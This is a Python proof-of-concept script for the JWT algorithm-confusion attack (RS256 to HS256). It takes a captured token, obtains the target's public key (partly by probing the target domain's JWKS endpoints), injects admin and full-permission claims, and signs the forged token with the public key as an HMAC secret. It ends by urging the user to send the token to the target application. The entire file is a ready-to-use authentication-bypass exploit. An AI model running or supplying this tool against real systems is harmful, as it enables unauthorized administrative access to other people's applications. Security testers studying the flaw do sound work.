#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack POC (HS256 vs RS256)
Simplified version for testing with existing JWT tokens
"""

import jwt
import base64
import json
import hmac
import hashlib
import argparse
import requests
from termcolor import colored

def banner():
    print(colored("""
╔═══════════════════════════════════════════════════════════════════════╗
║         JWT Algorithm Confusion Attack POC (HS256 vs RS256)           ║
║                                                                       ║
║  Test if an application is vulnerable to algorithm confusion by       ║
║  changing RS256 to HS256 and signing with the public key              ║
╚═══════════════════════════════════════════════════════════════════════╝
    """, "red"))

def decode_jwt(token):
    """Decode JWT without verification to see header and payload"""
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        return header, payload
    except Exception as e:
        print(f"[ERROR] Failed to decode JWT: {str(e)}")
        return None, None

def get_public_key_from_jwks(url):
    """Fetch public key from JWKS endpoint"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            jwks = response.json()
            if 'keys' in jwks and len(jwks['keys']) > 0:
                return jwks['keys'][0]  # Return first key
    except Exception as e:
        print(f"[ERROR] Failed to fetch JWKS: {str(e)}")
    return None

def create_forged_token(original_token, public_key, new_payload=None):
    """Create a forged token using algorithm confusion"""
    
    # Decode original token to get its structure
    header, payload = decode_jwt(original_token)
    if not header or not payload:
        return None
    
    print(f"[INFO] Original header: {header}")
    print(f"[INFO] Original payload: {payload}")
    
    # Create new header with HS256
    new_header = {"alg": "HS256", "typ": "JWT"}
    if 'kid' in header:
        new_header['kid'] = header['kid']  # Keep key ID if present
    
    # Use provided payload or modify original
    if new_payload:
        payload.update(new_payload)
    
    # Add common admin claims
    payload.update({
        "admin": True,
        "role": "admin",
        "is_admin": True,
        "permissions": ["read", "write", "delete", "admin"]
    })
    
    try:
        # Create forged token using HMAC with public key as secret
        forged_token = jwt.encode(payload, public_key, algorithm='HS256', headers=new_header)
        return forged_token
    except Exception as e:
        print(f"[ERROR] Failed to create forged token: {str(e)}")
        return None

def test_token_with_different_formats(forged_token, original_token, public_key):
    """Try different public key formats for the attack"""
    
    formats_to_try = []
    
    # Original format
    formats_to_try.append(public_key)
    
    # Remove whitespace variations
    if isinstance(public_key, str):
        # Try without extra newlines
        formats_to_try.append(public_key.strip())
        
        # Try with different line endings
        formats_to_try.append(public_key.replace('\r\n', '\n'))
        formats_to_try.append(public_key.replace('\n', '\r\n'))
        
        # Try base64 encoded version
        try:
            b64_key = base64.b64encode(public_key.encode()).decode()
            formats_to_try.append(b64_key)
        except:
            pass
    
    forged_tokens = []
    
    for key_format in formats_to_try:
        try:
            forged = create_forged_token(original_token, key_format)
            if forged:
                forged_tokens.append((forged, key_format))
        except:
            continue
    
    return forged_tokens

def manual_key_format():
    """Allow manual input of public key in different formats"""
    print("\n[INFO] Public key format options:")
    print("1. PEM format (-----BEGIN PUBLIC KEY-----...)")
    print("2. JWKS format (JSON)")
    print("3. Base64 encoded")
    print("4. Try to fetch from common endpoints")
    
    choice = input("Enter choice (1-4): ").strip()
    
    if choice == "1":
        print("Paste the PEM public key (press Enter twice when done):")
        lines = []
        while True:
            line = input()
            if line == "" and lines and lines[-1] == "":
                break
            lines.append(line)
        
        public_key = "\n".join(lines).strip()
        return public_key
    
    elif choice == "2":
        print("Paste the JWKS JSON:")
        try:
            jwks = json.loads(input())
            if 'keys' in jwks and len(jwks['keys']) > 0:
                return json.dumps(jwks['keys'][0])
        except:
            print("[ERROR] Invalid JSON format")
            return None
    
    elif choice == "3":
        print("Enter base64 encoded public key:")
        try:
            b64_key = input().strip()
            return base64.b64decode(b64_key).decode()
        except:
            print("[ERROR] Invalid base64 encoding")
            return None
    
    elif choice == "4":
        domain = input("Enter target domain (e.g., example.com): ").strip()
        endpoints = [
            f"https://{domain}/.well-known/jwks.json",
            f"https://{domain}/jwks.json",
            f"https://{domain}/.well-known/jwt.json"
        ]
        
        for url in endpoints:
            try:
                print(f"[INFO] Trying {url}...")
                key = get_public_key_from_jwks(url)
                if key:
                    print(f"[SUCCESS] Found key at {url}")
                    return json.dumps(key)
            except:
                continue
        
        print("[FAILED] Could not fetch public key from common endpoints")
        return None
    
    return None

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='JWT Algorithm Confusion Attack POC')
    parser.add_argument('-j', '--jwt', help='Original JWT token', required=True)
    parser.add_argument('-k', '--public-key', help='Public key (PEM format or file path)')
    parser.add_argument('-jwk', '--jwks-url', help='JWKS endpoint URL')
    parser.add_argument('-p', '--payload', help='Additional payload as JSON string')
    parser.add_argument('-o', '--output', help='Output forged token to file')
    parser.add_argument('--manual', action='store_true', help='Manual key input mode')
    
    args = parser.parse_args()
    
    # Decode original token
    print(f"[INFO] Analyzing original token...")
    header, payload = decode_jwt(args.jwt)
    
    if not header or not payload:
        print("[ERROR] Invalid JWT token")
        return
    
    print(f"[INFO] Algorithm: {header.get('alg', 'unknown')}")
    print(f"[INFO] Key ID: {header.get('kid', 'none')}")
    
    # Get public key
    public_key = None
    
    if args.manual:
        public_key = manual_key_format()
    
    elif args.public_key:
        # Try to read as file first
        try:
            with open(args.public_key, 'r') as f:
                public_key = f.read()
            print(f"[INFO] Loaded public key from file: {args.public_key}")
        except:
            # Use as direct input
            public_key = args.public_key
            print(f"[INFO] Using provided public key string")
    
    elif args.jwks_url:
        key_data = get_public_key_from_jwks(args.jwks_url)
        if key_data:
            public_key = json.dumps(key_data)
            print(f"[INFO] Fetched public key from JWKS endpoint")
    
    else:
        print("[ERROR] No public key provided. Use -k, -jwk, or --manual")
        return
    
    if not public_key:
        print("[ERROR] Failed to obtain public key")
        return
    
    # Parse additional payload if provided
    additional_payload = {}
    if args.payload:
        try:
            additional_payload = json.loads(args.payload)
        except:
            print("[WARNING] Invalid additional payload JSON, ignoring...")
    
    # Create forged token
    print("\n[INFO] Creating forged token...")
    forged_token = create_forged_token(args.jwt, public_key, additional_payload)
    
    if forged_token:
        print(colored("\n[SUCCESS] Forged token created!", "green"))
        print(f"\nForged JWT Token:")
        print(colored(forged_token, "cyan"))
        
        # Show decoded version
        forged_header, forged_payload = decode_jwt(forged_token)
        print(f"\nForged header: {forged_header}")
        print(f"Forged payload: {forged_payload}")
        
        # Save to file if requested
        if args.output:
            with open(args.output, 'w') as f:
                f.write(forged_token)
            print(f"[INFO] Token saved to {args.output}")
        
        # Test different formats if original uses RSA
        if header.get('alg', '').startswith('RS'):
            print("\n[INFO] Testing different key formats...")
            alternative_tokens = test_token_with_different_formats(forged_token, args.jwt, public_key)
            
            if alternative_tokens:
                print(f"[INFO] Generated {len(alternative_tokens)} alternative tokens")
                for i, (token, key_format) in enumerate(alternative_tokens[:3]):  # Show first 3
                    print(f"\nAlternative {i+1} (format: {key_format[:50]}...):")
                    print(colored(token, "yellow"))
        
        print("\n" + colored("="*70, "green"))
        print(colored("Test this token against the target application!", "green"))
        print(colored("Try sending it in:", "green"))
        print(colored("  - Authorization: Bearer <token>", "green"))
        print(colored("  - Cookie header", "green"))
        print(colored("  - Custom JWT header", "green"))
        print(colored("="*70, "green"))
        
    else:
        print(colored("[FAILED] Failed to create forged token", "red"))

if __name__ == "__main__":
    main()
